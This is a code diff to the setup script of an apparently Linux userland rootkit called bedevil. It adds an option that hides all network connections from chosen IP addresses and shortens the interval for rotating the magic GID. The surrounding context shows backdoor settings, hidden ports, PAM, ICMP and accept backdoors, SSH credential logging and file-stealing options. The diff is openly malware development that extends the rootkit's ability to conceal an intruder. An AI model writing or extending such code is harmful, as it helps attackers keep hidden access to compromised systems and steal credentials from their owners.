@@ -30,6 +30,7 @@ MAGIC_ACK = 0xc500
 
 NUM_HIDDEN_PORTS = 2     # no. of random port numbers to be hidden by default. they are displayed during setup & installation.
 CUSTOM_PORTS     = []    # specify ports here if you'd rather choose.
+HIDDEN_IP_ADDRS  = []    # ipv4 addresses in this list will be hidden. (hide all connections from a specific source)
 # END OF BACKDOOR SETTINGS
 
 
@@ -52,8 +53,8 @@ GID_TYPE = {
     #'1234':True,                # custom
 }
 READ_GID_FROM_FILE = True   # magic GID value is determined by the contents of a file.
-AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` seconds. (30 min)
-GID_CHANGE_MINTIME = 60 * 30
+AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` seconds. (20 min)
+GID_CHANGE_MINTIME = 60 * 20
 
 
 HIDE_MY_ASS      = True     # keep track of hidden things created by yourself that don't belong to the rootkit. works recursively. initially was for rehiding upon a GID change.
@@ -371,6 +372,11 @@ class Util():
         hashd = crypt(plain, "$6$"+salt)
         return hashd
 
+    def checkthing(self, thing):
+        if not thing == None and not len(thing) == 0:
+            return True
+        return False
+
     def getpathroot(self):
         basedirs = self.rootdirs
         randroot = choice(basedirs)
@@ -449,7 +455,8 @@ SETTINGS = { # all of these are written to bedevil.h. if a value is None it is s
     'MAX_GID':MAX_GID,                       'MIN_GID':MIN_GID,
     'TARGET_INTERFACE':TARGET_INTERFACE,     'MAGIC_ID':MAGIC_ID,
     'MAGIC_SEQ':MAGIC_SEQ,                   'MAGIC_ACK':MAGIC_ACK,
-    'EXEC_LOGS':ut.randpath(17),             'PLAINSOPATH':ut.sogetplainpath(INSTALL_DIR, BDVLSO)
+    'EXEC_LOGS':ut.randpath(17),             'PLAINSOPATH':ut.sogetplainpath(INSTALL_DIR, BDVLSO),
+    'HIDEADDRS':ut.randpath(16)
 }
 
 # the following paths are linked to within the installation directory.
@@ -458,7 +465,7 @@ LINKPATHS = {
     SETTINGS['SSH_LOGS']:'ssh_logs',         SETTINGS['HIDEPORTS']:'hide_ports',
     SETTINGS['INTEREST_DIR']:'interest_dir', SETTINGS['LOG_PATH']:'auth_logs',
     SETTINGS['ASS_PATH']:'my_ass',           SETTINGS['INSTALL_DIR']:'install_dir',
-    SETTINGS['EXEC_LOGS']:'exec_logs'
+    SETTINGS['EXEC_LOGS']:'exec_logs',       SETTINGS['HIDEADDRS']:'hide_addrs'
 }
 
 # these must be checked & based on the values, subsequently written to config.h
@@ -473,7 +480,7 @@ CHECKTHESE = {
     'SYMLINK_ONLY':SYMLINK_ONLY,                 'USE_PAM_BD':USE_PAM_BD,
     'USE_ICMP_BD':USE_ICMP_BD,                   'HIDE_MY_ASS':HIDE_MY_ASS,
     'USE_ACCEPT_BD':USE_ACCEPT_BD,               'LOG_USER_EXEC':LOG_USER_EXEC,
-    'ORIGINAL_RW_FALLBACK':ORIGINAL_RW_FALLBACK
+    'ORIGINAL_RW_FALLBACK':ORIGINAL_RW_FALLBACK, 'HIDE_ADDRS':ut.checkthing(HIDDEN_IP_ADDRS)
 }
 
 # paths here suffixed with a '/' are treated as directories by the rootkit.
@@ -493,7 +500,8 @@ NOTRACK = {  # stuff that HIDE_MY_ASS does not need to track.
     SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER, SETTINGS['HIDEPORTS']:True,
     SETTINGS['SSH_LOGS']:LOG_SSH,              SETTINGS['INTEREST_DIR']:FILE_STEAL,
     SETTINGS['HOMEDIR']:True,                  SETTINGS['ASS_PATH']:True,
-    SETTINGS['CLEANEDTIME_PATH']:True,         SETTINGS['EXEC_LOGS']:LOG_USER_EXEC
+    SETTINGS['CLEANEDTIME_PATH']:True,         SETTINGS['EXEC_LOGS']:LOG_USER_EXEC,
+    SETTINGS['HIDEADDRS']:ut.checkthing(HIDDEN_IP_ADDRS)
 }
 
 PATCHLISTS = { # stuff for ldpatch
@@ -599,6 +607,10 @@ def setup_config():
     bdvlportsarr = CArray('bdvlports', BDVLPORTS, arrtype='int')
     gotbdvlh += bdvlportsarr.create()
     if USE_ACCEPT_BD == True: BDVLPORTS.remove(ACCEPT_PORT)
+
+    if not HIDDEN_IP_ADDRS == None and not len(HIDDEN_IP_ADDRS) == 0:
+        addrslist = CArray('hideipaddrs', HIDDEN_IP_ADDRS)
+        gotbdvlh += addrslist.create()
 
     if SSHD_PATCH_SOFT == True or SSHD_PATCH_HARD == True:
         patchkeys, patchvals = list(PATCHLISTS.keys()), list(PATCHLISTS.values())
